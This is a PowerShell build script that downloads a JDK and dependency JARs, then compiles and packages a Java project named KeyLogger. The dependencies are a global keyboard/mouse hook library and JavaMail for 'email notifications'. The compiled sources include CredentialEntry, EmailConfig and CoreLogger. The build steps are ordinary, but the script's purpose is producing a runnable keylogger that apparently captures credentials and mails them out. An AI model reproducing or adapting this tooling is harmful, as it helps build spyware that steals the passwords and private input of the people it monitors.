# build.ps1 -- KeyLogger build script (no Maven / JDK pre-install needed)
# Downloads a portable JDK and all dependency JARs, then compiles.

Set-StrictMode -Version Latest
$ErrorActionPreference = "Stop"

$ProjectRoot = $PSScriptRoot
$LibDir      = Join-Path $ProjectRoot "lib"
$OutDir      = Join-Path $ProjectRoot "out"
$JdkDir      = Join-Path $ProjectRoot "jdk"
$SrcRoot     = Join-Path $ProjectRoot "src\main\java"

# ── Step 0: find or download a JDK ──────────────────────────────────────────

function Find-Javac {
    # 1. Already on PATH
    $javac = Get-Command javac -ErrorAction SilentlyContinue
    if ($javac) { return $javac.Source }

    # 2. JAVA_HOME
    if ($env:JAVA_HOME) {
        $p = Join-Path $env:JAVA_HOME "bin\javac.exe"
        if (Test-Path $p) { return $p }
    }

    # 3. Common installation directories
    $searchRoots = @(
        "C:\Program Files\Java",
        "C:\Program Files\Eclipse Adoptium",
        "C:\Program Files\Microsoft",
        "C:\Program Files\Zulu",
        "C:\Program Files\BellSoft",
        "C:\Program Files (x86)\Java"
    )
    foreach ($root in $searchRoots) {
        if (Test-Path $root) {
            $found = Get-ChildItem $root -Filter "javac.exe" -Recurse -ErrorAction SilentlyContinue |
                     Select-Object -First 1
            if ($found) { return $found.FullName }
        }
    }

    # 4. Portable JDK we may have downloaded previously (flat or nested)
    $p = Join-Path $JdkDir "bin\javac.exe"
    if (Test-Path $p) { return $p }
    if (Test-Path $JdkDir) {
        $found = Get-ChildItem $JdkDir -Filter "javac.exe" -Recurse -ErrorAction SilentlyContinue |
                 Select-Object -First 1
        if ($found) { return $found.FullName }
    }

    return $null
}

Write-Host ""
Write-Host "============================================================"
Write-Host " KeyLogger -- Build Script"
Write-Host "============================================================"

Write-Host ""
Write-Host "[1/4] Locating JDK..."
$javac = Find-Javac

if (-not $javac) {
    Write-Host "  No JDK found. Downloading portable OpenJDK 11 (~190 MB)..."
    Write-Host "  (this is a one-time download)"

    New-Item -ItemType Directory -Force -Path $JdkDir | Out-Null
    $jdkZip = Join-Path $JdkDir "jdk11.zip"

    # Adoptium Temurin 11 -- latest GA for Windows x64
    $jdkUrl = "https://api.adoptium.net/v3/binary/latest/11/ga/windows/x64/jdk/hotspot/normal/eclipse"

    Write-Host "  Downloading from $jdkUrl ..."
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    Invoke-WebRequest -Uri $jdkUrl -OutFile $jdkZip -UseBasicParsing

    Write-Host "  Extracting..."
    # Extract into $JdkDir; ZIP has a single top-level folder like jdk-11.0.xx+y
    Add-Type -AssemblyName System.IO.Compression.FileSystem
    [System.IO.Compression.ZipFile]::ExtractToDirectory($jdkZip, $JdkDir)
    Remove-Item $jdkZip

    # Find javac.exe inside the extracted folder (no flattening needed)
    $found = Get-ChildItem $JdkDir -Filter "javac.exe" -Recurse -ErrorAction SilentlyContinue |
             Select-Object -First 1
    $javac = if ($found) { $found.FullName } else { $null }

    if (-not $javac) {
        Write-Host "ERROR: JDK extraction failed. Please install Java 11+ manually."
        exit 1
    }
    Write-Host "  JDK ready."
} else {
    Write-Host "  Found: $javac"
}

$javaHome = Split-Path (Split-Path $javac -Parent) -Parent
$jar      = Join-Path (Split-Path $javac -Parent) "jar.exe"

# ── Step 2: Download dependency JARs ─────────────────────────────────────────

Write-Host ""
Write-Host "[2/4] Checking dependency JARs..."
New-Item -ItemType Directory -Force -Path $LibDir | Out-Null

$deps = @(
    @{
        File = "jnativehook-2.1.0.jar"
        Url  = "https://repo1.maven.org/maven2/com/1stleg/jnativehook/2.1.0/jnativehook-2.1.0.jar"
        Desc = "JNativeHook 2.1.0 (global keyboard/mouse hooks)"
    },
    @{
        File = "javax.mail-1.6.2.jar"
        Url  = "https://repo1.maven.org/maven2/com/sun/mail/javax.mail/1.6.2/javax.mail-1.6.2.jar"
        Desc = "JavaMail 1.6.2 (email notifications)"
    },
    @{
        File = "activation-1.1.1.jar"
        Url  = "https://repo1.maven.org/maven2/javax/activation/activation/1.1.1/activation-1.1.1.jar"
        Desc = "javax.activation 1.1.1 (JavaMail dependency)"
    }
)

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

foreach ($dep in $deps) {
    $dest = Join-Path $LibDir $dep.File
    if (Test-Path $dest) {
        Write-Host "  Already present: $($dep.File)"
    } else {
        Write-Host "  Downloading $($dep.Desc)..."
        Invoke-WebRequest -Uri $dep.Url -OutFile $dest -UseBasicParsing
        Write-Host "  OK: $($dep.File)"
    }
}

# ── Step 3: Compile ───────────────────────────────────────────────────────────

Write-Host ""
Write-Host "[3/4] Compiling..."
New-Item -ItemType Directory -Force -Path $OutDir | Out-Null

$cp = ($deps | ForEach-Object { Join-Path $LibDir $_.File }) -join ";"

$sources = @(
    "$SrcRoot\keylogger\CredentialEntry.java",
    "$SrcRoot\keylogger\EmailConfig.java",
    "$SrcRoot\keylogger\CoreLogger.java",
    "$SrcRoot\keylogger\App.java"
)

& $javac -encoding UTF-8 -cp $cp -d $OutDir $sources
if ($LASTEXITCODE -ne 0) {
    Write-Host ""
    Write-Host "ERROR: compilation failed."
    exit 1
}
Write-Host "  Compiled OK."

# ── Step 4: Package ───────────────────────────────────────────────────────────

Write-Host ""
Write-Host "[4/4] Packaging keylogger.jar..."

# Manifest: Class-Path lists the lib/ JARs relative to where the JAR will sit
$manifestPath = Join-Path $OutDir "MANIFEST.MF"
$cpEntry = ($deps | ForEach-Object { "lib/$($_.File)" }) -join " "
@"
Main-Class: keylogger.App
Class-Path: $cpEntry

"@ | Set-Content $manifestPath -Encoding Ascii

$jarOut = Join-Path $ProjectRoot "keylogger.jar"
& $jar cfm $jarOut $manifestPath -C $OutDir .
if ($LASTEXITCODE -ne 0) {
    Write-Host "ERROR: jar packaging failed."
    exit 1
}

Write-Host ""
Write-Host "============================================================"
Write-Host " Build successful!"
Write-Host " Run:  java -jar keylogger.jar"
Write-Host " Or double-click: run.bat"
Write-Host "============================================================"
